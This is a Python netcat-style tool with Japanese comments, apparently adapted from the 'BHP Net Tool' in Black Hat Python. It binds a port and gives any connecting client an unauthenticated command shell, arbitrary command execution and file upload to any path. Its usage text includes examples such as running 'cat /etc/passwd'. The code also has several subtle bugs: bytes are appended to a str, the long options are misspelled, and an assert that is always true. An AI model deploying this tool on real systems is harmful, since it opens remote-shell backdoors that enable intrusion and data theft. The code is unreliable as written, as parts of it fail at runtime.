# グローバル変数の定義
import getopt
import socket
import subprocess
import sys
import threading

listen = False
command = False
upload = False
execute = ""
target = ""
upload_destination = ""
port = 0


def usage():
    print(
        "BHP Net Tool\n"
        "\n"
        "Usage: bhnet.py -t target_host -p port\n"
        "-l --listen                - listen on [host]:[port] for\n"
        "                             incoming connections\n"
        "-e --execute=file_to_run   - execute the given file upon\n"
        "                             receiving a connection\n"
        "-c --command               - initialize a command shell\n"
        "-u --upload=destination    - upon receiving connection upload a\n"
        "                             file and write to [destination]\n"
        "\n"
        "\n"
        "Examples: \n"
        "bhnet.py -t 192.168.0.1 -p 555 -l -c\n"
        "bhnet.py -t 192.168.0.1 -p 555 -l -u c://target.exe\n"
        "bhnet.py -t 192.168.0.1 -p 555 -l -e \"cat /etc/passwd\"\n"
        "echo 'ABCDEFCHI' | ./bhnet.py -t 192.168.11.12 -p 135\n"
    )
    exit(0)


def client_sender(buffer):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        client.connect((target, port))
        print("[*] Client connected.")

        if len(buffer):
            client.send(buffer.encode())

        while True:
            response = ""

            while True:
                data = client.recv(4096).decode()
                response += data
                if len(data) < 4096:
                    break

            print(response, )

            # 追加の入力を待機
            buffer = input()
            buffer += '\n'

            client.send(buffer.encode())
            if "exit" in buffer:
                break

    except OSError as e:
        print(f"[*] {e} Exiting.")

    client.close()


def client_hander(client_socket):
    global upload
    global execute
    global command

    if len(upload_destination):
        # 全てのデータを読み取り，指定されたファイルにデータ書き込み
        file_buffer = ""

        # 受信データがなくなるまでデータ受信を継続
        while True:
            data = client_socket.recv(1024)
            if len(data) == 0:
                break
            file_buffer += data

        # 受信したデータをファイルに書き込み
        try:
            file_descriptor = open(upload_destination, "wb")
            file_descriptor.write(file_buffer)
            file_descriptor.close()

            # ファイル書き込みの成否を通知
            client_socket.send(f"Successfully saved file to {upload_destination}\r\n".encode())
        except OSError:
            client_socket.send(f"Failed to save file to {upload_destination}\r\n".encode())

    # コマンド実行を指定されているかどうかの確認
    if len(execute):
        output = run_command(execute)
        client_socket.send(output)

    # コマンドシェルの実行を指定されている場合の処理
    try:
        if command:
            prompt = "<BHP:#> "
            client_socket.send(prompt.encode())

            while True:
                # 改行を受け取るまでデータを受信
                cmd_buffer = ""
                while "\n" not in cmd_buffer:
                    buffer = client_socket.recv(1024).decode()
                    cmd_buffer += buffer

                if "exit" in cmd_buffer:
                    break

                # コマンドの実行結果を取得
                print(f"Exec command:{cmd_buffer}")
                response = run_command(cmd_buffer)
                response += prompt

                client_socket.send(response.encode())
    except OSError as e:
        print(e)

    client_socket.close()


def server_loop():
    global target

    # 待機するIPアドレスが指定されていない場合は
    # 全てのインタフェースで接続を待機
    if not len(target):
        target = "0.0.0.0"

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((target, port))
    server.listen(5)

    try:
        while True:
            client_socket, addr = server.accept()
            client_thread = threading.Thread(target=client_hander, args=(client_socket,))
            client_thread.start()
    except Exception as e:
        print(f"[!] {e} Close server.")
        server.close()


def run_command(com):
    com = com.rstrip()

    # コマンドを実行し出力結果を取得
    try:
        output = subprocess.check_output(com, stderr=subprocess.STDOUT, shell=True).decode()
    except Exception as e:
        output = f"Failed to execute command: {e}\r\n"

    return output


def main():
    global listen
    global port
    global execute
    global command
    global upload_destination
    global target

    if not len(sys.argv[1:]):
        usage()

    # コマンドラインアプションの読み込み
    opts = ""
    try:
        opts, args = getopt.getopt(
            sys.argv[1:],
            "hle:t:p:cu:",
            ["help", "listen", "execute=", "target=", "port=", "command", "upload-"]
        )
    except getopt.GetoptError as err:
        print(err)
        usage()

    for o, a in opts:
        if o in ("-h", "--help"):
            usage()
        elif o in ("-l", "--listen"):
            listen = True
        elif o in ("-e", "--execute"):
            execute = a
        elif o in ("-c", "--commandshell"):
            command = True
        elif o in ("-u", "--upload"):
            upload_destination = a
        elif o in ("-t", "--target"):
            target = a
        elif o in ("-p", "--port"):
            port = int(a)
        else:
            assert (False, "Unhandled Option")

    if not listen and len(target) and port > 0:
        # コマンドラインからの入力をbufferに格納する
        # 入力がこないと処理が継続されないので，
        # 標準入力にデータを送らない場合はCtrl-Dを入力すること
        buffer = sys.stdin.read()
        client_sender(buffer)

    if listen:
        server_loop()


main()
